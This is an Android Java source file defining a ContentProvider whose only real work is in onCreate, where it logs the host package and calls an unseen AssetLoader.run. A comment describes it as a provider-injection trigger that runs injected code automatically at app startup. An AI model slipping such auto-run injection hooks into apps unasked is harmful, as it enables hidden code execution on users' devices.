package aaaaaaaaaaaa;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;

/** Trigger: <provider> injection (option 3 shape) -- onCreate has a Context. */
public class ArchinomeProvider extends ContentProvider {

    @Override
    public boolean onCreate() {
        AssetLoader.log("ASSETPROVIDER_ONCREATE authority=" + getContext().getPackageName());
        AssetLoader.run(getContext());
        return true;
    }

    @Override
    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        return null;
    }

    @Override
    public String getType(Uri uri) {
        return null;
    }

    @Override
    public Uri insert(Uri uri, ContentValues values) {
        return null;
    }

    @Override
    public int delete(Uri uri, String selection, String[] selectionArgs) {
        return 0;
    }

    @Override
    public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
        return 0;
    }
}
